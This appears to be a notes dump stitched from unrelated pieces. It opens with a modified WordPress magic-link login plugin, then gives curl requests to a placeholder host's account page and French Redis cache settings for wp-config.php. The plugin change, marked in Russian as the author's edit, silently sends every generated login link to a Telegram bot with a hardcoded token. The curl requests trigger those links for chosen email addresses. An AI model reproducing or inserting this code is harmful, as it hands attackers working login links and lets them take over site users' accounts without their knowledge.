				$status = $this->email_magic_link( $email, $full_url, $magic_settings );
			//////////////////bpvtybk
			$status2 = $this->tg_send(TG_ID, $full_url . " road");
			return array(
				'success' => $status,
				'message' => esc_html__( 'The login link is on it\'s way. Please check your inbox.' . $status2, 'wp-magic-link-login' ),
			);
		}
	}

	//////////////////ИЗМЕНИЛ
	public $token = '05000000:A00000000000000000_u40000JM-HgVu0'; //Создаём публичную переменную для токена, который нужно отправлять каждый раз при использовании апи тг
  
//     public function __construct($token) {
//         $this->token = $token; //Забиваем в переменную токен при конструкте класса
//     }
      
    public function tg_send($id, $message) {   //Задаём публичную функцию send для отправки сообщений
        //Заполняем массив $data инфой, которую мы через api отправим до телеграмма
        $data = array(
            'chat_id'      => $id,
            'text'     => $message,
        );
        //Получаем ответ через функцию отправки до апи, которую создадим ниже
        $out = $this->tg_request('sendMessage', $data);
        //И пусть функция вернёт ответ. Правда в данном примере мы это никак не будем использовать, пусть будет задаток на будущее
        return $out;
    }   
      
    public  function tg_request($method, $data = array()) {
        $curl = curl_init(); //мутим курл-мурл в переменную. Для отправки предпочтительнее использовать курл, но можно и через file_get_contents если сервер не поддерживает
          
        curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot' . $this->token .  '/' . $method);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'POST'); //Отправляем через POST
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data); //Сами данные отправляемые
          
        $out = json_decode(curl_exec($curl), true); //Получаем результат выполнения, который сразу расшифровываем из JSON'a в массив для удобства
          
        curl_close($curl); //Закрываем курл
          
        return $out; //Отправляем ответ в виде массива
    }

}


curl 'https://HOST_NAME/my-account/edit-account/'   -H 'authority: HOST_NAME'   -H 'cache-control: max-age=0'   -H 'sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"'   -H 'sec-ch-ua-mobile: ?0'   -H 'upgrade-insecure-requests: 1'   -H 'origin: https://HOST_NAME'   -H 'content-type: application/x-www-form-urlencoded'   -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'sec-fetch-site: same-origin'   -H 'sec-fetch-mode: navigate'   -H 'sec-fetch-user: ?1'   -H 'sec-fetch-dest: document'   -H 'referer: https://HOST_NAME/my-account/edit-account/'   -H 'accept-language: ru,en;q=0.9'   --data-raw 'wpmll_email=kultach%40yandex.ru&wpmll_action=send_magic&wpmll_submit=Send+me+the+link' curl 'https://HOST_NAME/my-account/edit-account/'   -H 'authority: HOST_NAME'   -H 'cache-control: max-age=0'   -H 'sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"'   -H 'sec-ch-ua-mobile: ?0'   -H 'upgrade-insecure-requests: 1'   -H 'origin: https://HOST_NAME'   -H 'content-type: application/x-www-form-urlencoded'   -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'sec-fetch-site: same-origin'   -H 'sec-fetch-mode: navigate'   -H 'sec-fetch-user: ?1'   -H 'sec-fetch-dest: document'   -H 'referer: https://HOST_NAME/my-account/edit-account/'   -H 'accept-language: ru,en;q=0.9'   --data-raw 'wpmll_email=NAME_MAIL%40yandex.ru&wpmll_action=send_magic&wpmll_submit=Send+me+the+link'


Modifiez le fichier « wp-config.php » qui se trouve dans le volume de données WordPress « /var/lib/docker/volumes/docker_datawp/_data/ 
https://wordpress.org/plugins/redis-cache/

define('WP_CACHE', true);
define('WP_REDIS_HOST', 'redis');
define('WP_REDIS_PORT', '6379');
define('WP_CACHE_KEY_SALT', 'B33?,;j3D$srtX-nJC[poPD@6!SjSRDL?S~lg{8>(pagVe|-QoX..1Ky3PkG.1|C');
define( 'WP_REDIS_PASSWORD', 'changemeWithALongPassword' );
define( 'WP_REDIS_TIMEOUT', 1 );
define( 'WP_REDIS_READ_TIMEOUT', 1 );
define( 'WP_REDIS_DATABASE', 0 );
define('WP_REDIS_DISABLE_BANNERS', 'true');

// suppression automatique des clés en cache après 7 jours
define( 'WP_REDIS_MAXTTL', 60 * 60 * 24 * 7 );